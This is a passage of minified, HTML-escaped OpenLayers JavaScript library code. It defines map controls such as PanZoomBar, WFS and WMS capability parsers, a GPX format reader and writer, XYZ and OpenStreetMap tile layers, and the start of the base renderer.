b.query.accuracy:(a=this.map.getCenter(),c=this.map.getViewPortPxFromLonLat(a),c.x++,c=this.map.getLonLatFromPixel(c),h.request.get_feature.query.accuracy=c.lon-a.lon);h.request.get_feature.query.where=b.query.where;h.request.get_feature.query.spatialfilter.relation="area_intersection";OpenLayers.Request.POST({url:this.getFullRequestString({CustomService:"Query"}),data:h.write(),callback:function(a){a=h.parseResponse(a.responseText);h.iserror()?e.call(f,null):e.call(f,a.features)}})},clone:function(a){null== a&amp;&amp;(a=new OpenLayers.Layer.ArcIMS(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},CLASS_NAME:"OpenLayers.Layer.ArcIMS"});OpenLayers.Control.PanZoom=OpenLayers.Class(OpenLayers.Control,{slideFactor:50,slideRatio:null,buttons:null,position:null,initialize:function(a){this.position=new OpenLayers.Pixel(OpenLayers.Control.PanZoom.X,OpenLayers.Control.PanZoom.Y);OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.map&amp;&amp;this.map.events.unregister("buttonclick",this,this.onButtonClick);this.removeButtons();this.position=this.buttons=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)}, setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.register("buttonclick",this,this.onButtonClick)},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position;this.buttons=[];var b={w:18,h:18},c=new OpenLayers.Pixel(a.x+b.w/2,a.y);this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h;this._addButton("panleft","west-mini.png",a,b);this._addButton("panright","east-mini.png",a.add(b.w,0),b);this._addButton("pandown","south-mini.png", c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);this._addButton("zoomworld","zoom-world-mini.png",c.add(0,4*b.h+5),b);this._addButton("zoomout","zoom-minus-mini.png",c.add(0,5*b.h+5),b);return this.div},_addButton:function(a,b,c,d){b=OpenLayers.Util.getImageLocation(b);c=OpenLayers.Util.createAlphaImageDiv(this.id+"_"+a,c,d,b,"absolute");c.style.cursor="pointer";this.div.appendChild(c);c.action=a;c.className="olButton";this.buttons.push(c);return c},_removeButton:function(a){this.div.removeChild(a); OpenLayers.Util.removeItem(this.buttons,a)},removeButtons:function(){for(var a=this.buttons.length-1;0&lt;=a;--a)this._removeButton(this.buttons[a])},onButtonClick:function(a){switch(a.buttonElement.action){case "panup":this.map.pan(0,-this.getSlideFactor("h"));break;case "pandown":this.map.pan(0,this.getSlideFactor("h"));break;case "panleft":this.map.pan(-this.getSlideFactor("w"),0);break;case "panright":this.map.pan(this.getSlideFactor("w"),0);break;case "zoomin":this.map.zoomIn();break;case "zoomout":this.map.zoomOut(); break;case "zoomworld":this.map.zoomToMaxExtent()}},getSlideFactor:function(a){return this.slideRatio?this.map.getSize()[a]*this.slideRatio:this.slideFactor},CLASS_NAME:"OpenLayers.Control.PanZoom"});OpenLayers.Control.PanZoom.X=4;OpenLayers.Control.PanZoom.Y=4;OpenLayers.Control.PanZoomBar=OpenLayers.Class(OpenLayers.Control.PanZoom,{zoomStopWidth:18,zoomStopHeight:11,slider:null,sliderEvents:null,zoombarDiv:null,zoomWorldIcon:!1,panIcons:!0,forceFixedZoomLevel:!1,mouseDragStart:null,deltaY:null,zoomStart:null,destroy:function(){this._removeZoomBar();this.map.events.un({changebaselayer:this.redraw,updatesize:this.redraw,scope:this});OpenLayers.Control.PanZoom.prototype.destroy.apply(this,arguments);delete this.mouseDragStart;delete this.zoomStart},setMap:function(a){OpenLayers.Control.PanZoom.prototype.setMap.apply(this, arguments);this.map.events.on({changebaselayer:this.redraw,updatesize:this.redraw,scope:this})},redraw:function(){null!=this.div&amp;&amp;(this.removeButtons(),this._removeZoomBar());this.draw()},draw:function(a){OpenLayers.Control.prototype.draw.apply(this,arguments);a=this.position.clone();this.buttons=[];var b={w:18,h:18};if(this.panIcons){var c=new OpenLayers.Pixel(a.x+b.w/2,a.y),d=b.w;this.zoomWorldIcon&amp;&amp;(c=new OpenLayers.Pixel(a.x+b.w,a.y));this._addButton("panup","north-mini.png",c,b);a.y=c.y+b.h; this._addButton("panleft","west-mini.png",a,b);this.zoomWorldIcon&amp;&amp;(this._addButton("zoomworld","zoom-world-mini.png",a.add(b.w,0),b),d*=2);this._addButton("panright","east-mini.png",a.add(d,0),b);this._addButton("pandown","south-mini.png",c.add(0,2*b.h),b);this._addButton("zoomin","zoom-plus-mini.png",c.add(0,3*b.h+5),b);c=this._addZoomBar(c.add(0,4*b.h+5));this._addButton("zoomout","zoom-minus-mini.png",c,b)}else this._addButton("zoomin","zoom-plus-mini.png",a,b),c=this._addZoomBar(a.add(0,b.h)), this._addButton("zoomout","zoom-minus-mini.png",c,b),this.zoomWorldIcon&amp;&amp;(c=c.add(0,b.h+3),this._addButton("zoomworld","zoom-world-mini.png",c,b));return this.div},_addZoomBar:function(a){var b=OpenLayers.Util.getImageLocation("slider.png"),c=this.id+"_"+this.map.id,d=this.map.getMinZoom(),e=this.map.getNumZoomLevels()-1-this.map.getZoom(),e=OpenLayers.Util.createAlphaImageDiv(c,a.add(-1,e*this.zoomStopHeight),{w:20,h:9},b,"absolute");e.style.cursor="move";this.slider=e;this.sliderEvents=new OpenLayers.Events(this, e,null,!0,{includeXY:!0});this.sliderEvents.on({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp,mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});var f={w:this.zoomStopWidth,h:this.zoomStopHeight*(this.map.getNumZoomLevels()-d)},b=OpenLayers.Util.getImageLocation("zoombar.png"),c=null;OpenLayers.Util.alphaHack()?(c=this.id+"_"+this.map.id,c=OpenLayers.Util.createAlphaImageDiv(c,a,{w:f.w,h:this.zoomStopHeight},b,"absolute",null,"crop"),c.style.height= f.h+"px"):c=OpenLayers.Util.createDiv("OpenLayers_Control_PanZoomBar_Zoombar"+this.map.id,a,f,b);c.style.cursor="pointer";c.className="olButton";this.zoombarDiv=c;this.div.appendChild(c);this.startTop=parseInt(c.style.top);this.div.appendChild(e);this.map.events.register("zoomend",this,this.moveZoomBar);return a=a.add(0,this.zoomStopHeight*(this.map.getNumZoomLevels()-d))},_removeZoomBar:function(){this.sliderEvents.un({touchstart:this.zoomBarDown,touchmove:this.zoomBarDrag,touchend:this.zoomBarUp, mousedown:this.zoomBarDown,mousemove:this.zoomBarDrag,mouseup:this.zoomBarUp});this.sliderEvents.destroy();this.div.removeChild(this.zoombarDiv);this.zoombarDiv=null;this.div.removeChild(this.slider);this.slider=null;this.map.events.unregister("zoomend",this,this.moveZoomBar)},onButtonClick:function(a){OpenLayers.Control.PanZoom.prototype.onButtonClick.apply(this,arguments);if(a.buttonElement===this.zoombarDiv){var b=a.buttonXY.y/this.zoomStopHeight;if(this.forceFixedZoomLevel||!this.map.fractionalZoom)b= Math.floor(b);b=this.map.getNumZoomLevels()-1-b;b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1);this.map.zoomTo(b)}},passEventToSlider:function(a){this.sliderEvents.handleBrowserEvent(a)},zoomBarDown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.map.events.on({touchmove:this.passEventToSlider,mousemove:this.passEventToSlider,mouseup:this.passEventToSlider,scope:this}),this.mouseDragStart=a.xy.clone(),this.zoomStart=a.xy.clone(),this.div.style.cursor= "move",this.zoombarDiv.offsets=null,OpenLayers.Event.stop(a)},zoomBarDrag:function(a){if(null!=this.mouseDragStart){var b=this.mouseDragStart.y-a.xy.y,c=OpenLayers.Util.pagePosition(this.zoombarDiv);0&lt;a.clientY-c[1]&amp;&amp;a.clientY-c[1]&lt;parseInt(this.zoombarDiv.style.height)-2&amp;&amp;(b=parseInt(this.slider.style.top)-b,this.slider.style.top=b+"px",this.mouseDragStart=a.xy.clone());this.deltaY=this.zoomStart.y-a.xy.y;OpenLayers.Event.stop(a)}},zoomBarUp:function(a){if((OpenLayers.Event.isLeftClick(a)||"touchend"=== a.type)&amp;&amp;this.mouseDragStart){this.div.style.cursor="";this.map.events.un({touchmove:this.passEventToSlider,mouseup:this.passEventToSlider,mousemove:this.passEventToSlider,scope:this});var b=this.map.zoom;!this.forceFixedZoomLevel&amp;&amp;this.map.fractionalZoom?(b+=this.deltaY/this.zoomStopHeight,b=Math.min(Math.max(b,0),this.map.getNumZoomLevels()-1)):(b+=this.deltaY/this.zoomStopHeight,b=Math.max(Math.round(b),0));this.map.zoomTo(b);this.zoomStart=this.mouseDragStart=null;this.deltaY=0;OpenLayers.Event.stop(a)}}, moveZoomBar:function(){var a=(this.map.getNumZoomLevels()-1-this.map.getZoom())*this.zoomStopHeight+this.startTop+1;this.slider.style.top=a+"px"},CLASS_NAME:"OpenLayers.Control.PanZoomBar"});OpenLayers.Format.WFSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.0",CLASS_NAME:"OpenLayers.Format.WFSCapabilities"});OpenLayers.Format.WFSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{wfs:"http://www.opengis.net/wfs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance",ows:"http://www.opengis.net/ows"},errorProperty:"featureTypeList",defaultPrefix:"wfs",read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wfs:{WFS_Capabilities:function(a, b){this.readChildNodes(a,b)},FeatureTypeList:function(a,b){b.featureTypeList={featureTypes:[]};this.readChildNodes(a,b.featureTypeList)},FeatureType:function(a,b){var c={};this.readChildNodes(a,c);b.featureTypes.push(c)},Name:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(c=c.split(":"),b.name=c.pop(),0&lt;c.length&amp;&amp;(b.featureNS=this.lookupNamespaceURI(a,c[0])))},Title:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.title=c)},Abstract:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b["abstract"]=c)}}}, CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1"});OpenLayers.Format.WFSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},readers:{wfs:OpenLayers.Util.applyDefaults({DefaultSRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs),ows:OpenLayers.Format.OWSCommon.v1.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_1_0"});OpenLayers.Layer.Image=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!0,url:null,extent:null,size:null,tile:null,aspectRatio:null,initialize:function(a,b,c,d,e){this.url=b;this.maxExtent=this.extent=c;this.size=d;OpenLayers.Layer.prototype.initialize.apply(this,[a,e]);this.aspectRatio=this.extent.getHeight()/this.size.h/(this.extent.getWidth()/this.size.w)},destroy:function(){this.tile&amp;&amp;(this.removeTileMonitoringHooks(this.tile),this.tile.destroy(),this.tile=null);OpenLayers.Layer.prototype.destroy.apply(this, arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Image(this.name,this.url,this.extent,this.size,this.getOptions()));return a=OpenLayers.Layer.prototype.clone.apply(this,[a])},setMap:function(a){null==this.options.maxResolution&amp;&amp;(this.options.maxResolution=this.aspectRatio*this.extent.getWidth()/this.size.w);OpenLayers.Layer.prototype.setMap.apply(this,arguments)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=null==this.tile;if(b||d){this.setTileSize(); var e=this.map.getLayerPxFromLonLat({lon:this.extent.left,lat:this.extent.top});d?(this.tile=new OpenLayers.Tile.Image(this,e,this.extent,null,this.tileSize),this.addTileMonitoringHooks(this.tile)):(this.tile.size=this.tileSize.clone(),this.tile.position=e.clone());this.tile.draw()}},setTileSize:function(){var a=this.extent.getWidth()/this.map.getResolution(),b=this.extent.getHeight()/this.map.getResolution();this.tileSize=new OpenLayers.Size(a,b)},addTileMonitoringHooks:function(a){a.onLoadStart= function(){this.events.triggerEvent("loadstart")};a.events.register("loadstart",this,a.onLoadStart);a.onLoadEnd=function(){this.events.triggerEvent("loadend")};a.events.register("loadend",this,a.onLoadEnd);a.events.register("unload",this,a.onLoadEnd)},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,scope:this})},setUrl:function(a){this.url=a;this.tile.draw()},getURL:function(a){return this.url},CLASS_NAME:"OpenLayers.Layer.Image"});OpenLayers.Strategy=OpenLayers.Class({layer:null,options:null,active:null,autoActivate:!0,autoDestroy:!0,initialize:function(a){OpenLayers.Util.extend(this,a);this.options=a;this.active=!1},destroy:function(){this.deactivate();this.options=this.layer=null},setLayer:function(a){this.layer=a},activate:function(){return this.active?!1:this.active=!0},deactivate:function(){return this.active?(this.active=!1,!0):!1},CLASS_NAME:"OpenLayers.Strategy"});OpenLayers.Strategy.Save=OpenLayers.Class(OpenLayers.Strategy,{events:null,auto:!1,timer:null,initialize:function(a){OpenLayers.Strategy.prototype.initialize.apply(this,[a]);this.events=new OpenLayers.Events(this)},activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a&amp;&amp;this.auto)if("number"===typeof this.auto)this.timer=window.setInterval(OpenLayers.Function.bind(this.save,this),1E3*this.auto);else this.layer.events.on({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave, scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.auto&amp;&amp;("number"===typeof this.auto?window.clearInterval(this.timer):this.layer.events.un({featureadded:this.triggerSave,afterfeaturemodified:this.triggerSave,scope:this}));return a},triggerSave:function(a){var b=a.feature;b.state!==OpenLayers.State.INSERT&amp;&amp;b.state!==OpenLayers.State.UPDATE&amp;&amp;b.state!==OpenLayers.State.DELETE||this.save([a.feature])},save:function(a){a||(a=this.layer.features); this.events.triggerEvent("start",{features:a});var b=this.layer.projection,c=this.layer.map.getProjectionObject();if(!c.equals(b)){for(var d=a.length,e=Array(d),f,g,h=0;h&lt;d;++h)f=a[h],g=f.clone(),g.fid=f.fid,g.state=f.state,f.url&amp;&amp;(g.url=f.url),g._original=f,g.geometry.transform(c,b),e[h]=g;a=e}this.layer.protocol.commit(a,{callback:this.onCommit,scope:this})},onCommit:function(a){var b={response:a};if(a.success()){for(var c=a.reqFeatures,d,e=[],f=a.insertIds||[],g=0,h=0,k=c.length;h&lt;k;++h)if(d=c[h], d=d._original||d,a=d.state)a==OpenLayers.State.DELETE?e.push(d):a==OpenLayers.State.INSERT&amp;&amp;(d.fid=f[g],++g),d.state=null;0&lt;e.length&amp;&amp;this.layer.destroyFeatures(e);this.events.triggerEvent("success",b)}else this.events.triggerEvent("fail",b)},CLASS_NAME:"OpenLayers.Strategy.Save"});OpenLayers.Events.featureclick=OpenLayers.Class({cache:null,map:null,provides:["featureclick","nofeatureclick","featureover","featureout"],initialize:function(a){this.target=a;if(a.object instanceof OpenLayers.Map)this.setMap(a.object);else if(a.object instanceof OpenLayers.Layer.Vector)a.object.map?this.setMap(a.object.map):a.object.events.register("added",this,function(b){this.setMap(a.object.map)});else throw"Listeners for '"+this.provides.join("', '")+"' events can only be registered for OpenLayers.Layer.Vector or OpenLayers.Map instances"; for(var b=this.provides.length-1;0&lt;=b;--b)a.extensions[this.provides[b]]=!0},setMap:function(a){this.map=a;this.cache={};a.events.register("mousedown",this,this.start,{extension:!0});a.events.register("mouseup",this,this.onClick,{extension:!0});a.events.register("touchstart",this,this.start,{extension:!0});a.events.register("touchmove",this,this.cancel,{extension:!0});a.events.register("touchend",this,this.onClick,{extension:!0});a.events.register("mousemove",this,this.onMousemove,{extension:!0})}, start:function(a){this.startEvt=a},cancel:function(a){delete this.startEvt},onClick:function(a){if(this.startEvt&amp;&amp;("touchend"===a.type||OpenLayers.Event.isLeftClick(a))){a=this.getFeatures(this.startEvt);delete this.startEvt;for(var b,c,d={},e=0,f=a.length;e&lt;f&amp;&amp;(b=a[e],c=b.layer,d[c.id]=!0,b=this.triggerEvent("featureclick",{feature:b}),!1!==b);++e);e=0;for(f=this.map.layers.length;e&lt;f;++e)c=this.map.layers[e],c instanceof OpenLayers.Layer.Vector&amp;&amp;!d[c.id]&amp;&amp;this.triggerEvent("nofeatureclick",{layer:c})}}, onMousemove:function(a){delete this.startEvt;var b=this.getFeatures(a),c={};a=[];for(var d,e=0,f=b.length;e&lt;f;++e)d=b[e],c[d.id]=d,this.cache[d.id]||a.push(d);var b=[],g;for(g in this.cache)d=this.cache[g],d.layer&amp;&amp;d.layer.map?c[d.id]||b.push(d):delete this.cache[g];e=0;for(f=a.length;e&lt;f&amp;&amp;(d=a[e],this.cache[d.id]=d,g=this.triggerEvent("featureover",{feature:d}),!1!==g);++e);e=0;for(f=b.length;e&lt;f&amp;&amp;(d=b[e],delete this.cache[d.id],g=this.triggerEvent("featureout",{feature:d}),!1!==g);++e);},triggerEvent:function(a, b){var c=b.feature?b.feature.layer:b.layer,d=this.target.object;if(d instanceof OpenLayers.Map||d===c)return this.target.triggerEvent(a,b)},getFeatures:function(a){var b=a.clientX,c=a.clientY,d=[],e=[],f=[],g,h,k,l;for(l=this.map.layers.length-1;0&lt;=l;--l)if(g=this.map.layers[l],"none"!==g.div.style.display)if(g.renderer instanceof OpenLayers.Renderer.Elements){if(g instanceof OpenLayers.Layer.Vector)for(h=document.elementFromPoint(b,c);h&amp;&amp;h._featureId;)(k=g.getFeatureById(h._featureId))?(d.push(k), h.style.display="none",e.push(h),h=document.elementFromPoint(b,c)):h=!1;f.push(g);g.div.style.display="none"}else g.renderer instanceof OpenLayers.Renderer.Canvas&amp;&amp;(k=g.renderer.getFeatureIdFromEvent(a))&amp;&amp;(d.push(k),f.push(g));l=0;for(a=e.length;l&lt;a;++l)e[l].style.display="";for(l=f.length-1;0&lt;=l;--l)f[l].div.style.display="block";return d},destroy:function(){for(var a=this.provides.length-1;0&lt;=a;--a)delete this.target.extensions[this.provides[a]];this.map.events.un({mousemove:this.onMousemove,mousedown:this.start, mouseup:this.onClick,touchstart:this.start,touchmove:this.cancel,touchend:this.onClick,scope:this});delete this.cache;delete this.map;delete this.target}});OpenLayers.Events.nofeatureclick=OpenLayers.Events.featureclick;OpenLayers.Events.featureover=OpenLayers.Events.featureclick;OpenLayers.Events.featureout=OpenLayers.Events.featureclick;OpenLayers.Format.GPX=OpenLayers.Class(OpenLayers.Format.XML,{defaultDesc:"No description available",extractWaypoints:!0,extractTracks:!0,extractRoutes:!0,extractAttributes:!0,namespaces:{gpx:"http://www.topografix.com/GPX/1/1",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd",creator:"OpenLayers",initialize:function(a){this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this, [a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=[];if(this.extractTracks)for(var c=a.getElementsByTagName("trk"),d=0,e=c.length;d&lt;e;d++){var f={};this.extractAttributes&amp;&amp;(f=this.parseAttributes(c[d]));for(var g=this.getElementsByTagNameNS(c[d],c[d].namespaceURI,"trkseg"),h=0,k=g.length;h&lt;k;h++){var l=this.extractSegment(g[h],"trkpt");b.push(new OpenLayers.Feature.Vector(l,f))}}if(this.extractRoutes)for(e=a.getElementsByTagName("rte"),c=0,d= e.length;c&lt;d;c++)f={},this.extractAttributes&amp;&amp;(f=this.parseAttributes(e[c])),g=this.extractSegment(e[c],"rtept"),b.push(new OpenLayers.Feature.Vector(g,f));if(this.extractWaypoints)for(a=a.getElementsByTagName("wpt"),c=0,e=a.length;c&lt;e;c++)f={},this.extractAttributes&amp;&amp;(f=this.parseAttributes(a[c])),d=new OpenLayers.Geometry.Point(a[c].getAttribute("lon"),a[c].getAttribute("lat")),b.push(new OpenLayers.Feature.Vector(d,f));if(this.internalProjection&amp;&amp;this.externalProjection)for(f=0,a=b.length;f&lt;a;f++)b[f].geometry.transform(this.externalProjection, this.internalProjection);return b},extractSegment:function(a,b){for(var c=this.getElementsByTagNameNS(a,a.namespaceURI,b),d=[],e=0,f=c.length;e&lt;f;e++)d.push(new OpenLayers.Geometry.Point(c[e].getAttribute("lon"),c[e].getAttribute("lat")));return new OpenLayers.Geometry.LineString(d)},parseAttributes:function(a){var b={};a=a.firstChild;for(var c,d;a;)1==a.nodeType&amp;&amp;a.firstChild&amp;&amp;(c=a.firstChild,3==c.nodeType||4==c.nodeType)&amp;&amp;(d=a.prefix?a.nodeName.split(":")[1]:a.nodeName,"trkseg"!=d&amp;&amp;"rtept"!=d&amp;&amp; (b[d]=c.nodeValue)),a=a.nextSibling;return b},write:function(a,b){a=OpenLayers.Util.isArray(a)?a:[a];var c=this.createElementNS(this.namespaces.gpx,"gpx");c.setAttribute("version","1.1");c.setAttribute("creator",this.creator);this.setAttributes(c,{"xsi:schemaLocation":this.schemaLocation});b&amp;&amp;"object"==typeof b&amp;&amp;c.appendChild(this.buildMetadataNode(b));for(var d=0,e=a.length;d&lt;e;d++)c.appendChild(this.buildFeatureNode(a[d]));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},buildMetadataNode:function(a){for(var b= ["name","desc","author"],c=this.createElementNS(this.namespaces.gpx,"metadata"),d=0;d&lt;b.length;d++){var e=b[d];if(a[e]){var f=this.createElementNS(this.namespaces.gpx,e);f.appendChild(this.createTextNode(a[e]));c.appendChild(f)}}return c},buildFeatureNode:function(a){var b=a.geometry,b=b.clone();this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;b.transform(this.internalProjection,this.externalProjection);if("OpenLayers.Geometry.Point"==b.CLASS_NAME){var c=this.buildWptNode(b);this.appendAttributesNode(c, a);return c}c=this.createElementNS(this.namespaces.gpx,"trk");this.appendAttributesNode(c,a);a=this.buildTrkSegNode(b);a=OpenLayers.Util.isArray(a)?a:[a];for(var b=0,d=a.length;b&lt;d;b++)c.appendChild(a[b]);return c},buildTrkSegNode:function(a){var b,c,d,e;if("OpenLayers.Geometry.LineString"==a.CLASS_NAME||"OpenLayers.Geometry.LinearRing"==a.CLASS_NAME){b=this.createElementNS(this.namespaces.gpx,"trkseg");c=0;for(d=a.components.length;c&lt;d;c++)e=a.components[c],b.appendChild(this.buildTrkPtNode(e)); return b}b=[];c=0;for(d=a.components.length;c&lt;d;c++)b.push(this.buildTrkSegNode(a.components[c]));return b},buildTrkPtNode:function(a){var b=this.createElementNS(this.namespaces.gpx,"trkpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b},buildWptNode:function(a){var b=this.createElementNS(this.namespaces.gpx,"wpt");b.setAttribute("lon",a.x);b.setAttribute("lat",a.y);return b},appendAttributesNode:function(a,b){var c=this.createElementNS(this.namespaces.gpx,"name");c.appendChild(this.createTextNode(b.attributes.name|| b.id));a.appendChild(c);c=this.createElementNS(this.namespaces.gpx,"desc");c.appendChild(this.createTextNode(b.attributes.description||this.defaultDesc));a.appendChild(c)},CLASS_NAME:"OpenLayers.Format.GPX"});OpenLayers.Format.WMSDescribeLayer=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.1.1",CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer"});OpenLayers.Format.WMSDescribeLayer.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSDescribeLayer,{initialize:function(a){OpenLayers.Format.WMSDescribeLayer.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var b=a.documentElement.childNodes,c={layerDescriptions:[]},d,e,f=0;f&lt;b.length;++f)if(d=b[f],e=d.nodeName,"LayerDescription"==e){e=d.getAttribute("name");var g="",h="",k="";d.getAttribute("owsType")?(g=d.getAttribute("owsType"), h=d.getAttribute("owsURL")):""!=d.getAttribute("wfs")?(g="WFS",h=d.getAttribute("wfs")):""!=d.getAttribute("wcs")&amp;&amp;(g="WCS",h=d.getAttribute("wcs"));d=d.getElementsByTagName("Query");0&lt;d.length&amp;&amp;((k=d[0].getAttribute("typeName"))||(k=d[0].getAttribute("typename")));d={layerName:e,owsType:g,owsURL:h,typeName:k};c.layerDescriptions.push(d);c.length=c.layerDescriptions.length;c[c.length-1]=d}else if("ServiceException"==e)return{error:(new OpenLayers.Format.OGCExceptionReport).read(a)};return c},CLASS_NAME:"OpenLayers.Format.WMSDescribeLayer.v1_1_1"}); OpenLayers.Format.WMSDescribeLayer.v1_1_0=OpenLayers.Format.WMSDescribeLayer.v1_1_1;OpenLayers.Layer.XYZ=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,sphericalMercator:!1,zoomOffset:0,serverResolutions:null,initialize:function(a,b,c){if(c&amp;&amp;c.sphericalMercator||this.sphericalMercator)c=OpenLayers.Util.extend({projection:"EPSG:900913",numZoomLevels:19},c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a||this.name,b||this.url,{},c])},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.XYZ(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getURL:function(a){a=this.getXYZ(a);var b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(""+a.x+a.y+a.z,b));return OpenLayers.String.format(b,a)},getXYZ:function(a){var b=this.getServerResolution(),c=Math.round((a.left-this.maxExtent.left)/(b*this.tileSize.w));a=Math.round((this.maxExtent.top-a.top)/(b*this.tileSize.h));b=this.getServerZoom();if(this.wrapDateLine)var d=Math.pow(2,b),c=(c%d+d)%d;return{x:c,y:a,z:b}},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this, arguments);this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.bottom))},CLASS_NAME:"OpenLayers.Layer.XYZ"});OpenLayers.Layer.OSM=OpenLayers.Class(OpenLayers.Layer.XYZ,{name:"OpenStreetMap",url:["http://a.tile.openstreetmap.org/${z}/${x}/${y}.png","http://b.tile.openstreetmap.org/${z}/${x}/${y}.png","http://c.tile.openstreetmap.org/${z}/${x}/${y}.png"],attribution:"&amp;copy; &lt;a href='http://www.openstreetmap.org/copyright'>OpenStreetMap&lt;/a> contributors",sphericalMercator:!0,wrapDateLine:!0,tileOptions:null,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.tileOptions= OpenLayers.Util.extend({crossOriginKeyword:"anonymous"},this.options&amp;&amp;this.options.tileOptions)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.OSM(this.name,this.url,this.getOptions()));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},CLASS_NAME:"OpenLayers.Layer.OSM"});OpenLayers.Renderer=OpenLayers.Class({container:null,root:null,extent:null,locked:!1,size:null,resolution:null,map:null,featureDx:0,initialize:function(a,b){this.container=OpenLayers.Util.getElement(a);OpenLayers.Util.extend(this,b)},destroy:function(){this.map=this.resolution=this.size=this.extent=this.container=null},supported:function(){return!1},setExtent:function(a,b){this.extent=a.clone();if(this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine){var c=a.getWidth()/this.map.getExtent().getWidth(); a=a.scale(1/c);this.extent=a.wrapDateLine(this.map.getMaxExtent()).scale(c)}b&amp;&amp;(this.resolution=null);return!0},setSize:function(a){this.size=a.clone();this.resolution=null},getResolution:function(){return this.resolution=this.resolution||this.map.getResolution()},drawFeature:function(a,b){null==b&amp;&amp;(b=a.style);if(a.geometry){var c=a.geometry.getBounds();if(c){var d;this.map.baseLayer&amp;&amp;this.map.baseLayer.wrapDateLine&amp;&amp;(d=this.map.getMaxExtent());c.intersectsBounds(this.extent,{worldBounds:d})?this.calculateFeatureDx(c, d):b={display:"none"};c=this.drawGeometry(a.geometry,b,a.id);if("none"!=b.display&amp;&amp;b.label&amp;&amp;!1!==c){d=a.geometry.getCentroid();if(b.labelXOffset||b.labelYOffset){var e=isNaN(b.labelXOffset)?0:b.labelXOffset,f=isNaN(b.labelYOffset)?0:b.labelYOffset,g=this.getResolution();d.move(e*g,f*g)}this.drawText(a.id,b,d)}else this.removeText(a.id);return c}}},calculateFeatureDx:function(a,b){this.featureDx=0;if(b){var c=b.getWidth();this.featureDx=Math.round(((a.left+a.right)/2-(this.extent.left+this.extent.right)/ 2)/c)*c}},drawGeometry:function(a,b,c){},drawText:function(a,b,c){},removeText:function(a){},clear:function(){},getFeatureIdFromEvent:function(a){},eraseFeatures:function(a){OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt;c;++b){var d=a[b];this.eraseGeometry(d.geometry,d.id);this.removeText(d.id)}},eraseGeometry:function(a,b){},moveRoot:function(a){},getRenderLayerId:function(){return this.container.id},applyDefaultSymbolizer:function(a){var b=OpenLayers.Util.extend({},OpenLayers.Renderer.defaultSymbolizer); !1===a.stroke&amp;&amp;(delete b.strokeWidth,delete b.strokeColor);!1===a.fill&amp;&amp;delete b.fillColor;OpenLayers.Util.extend(b,a);return 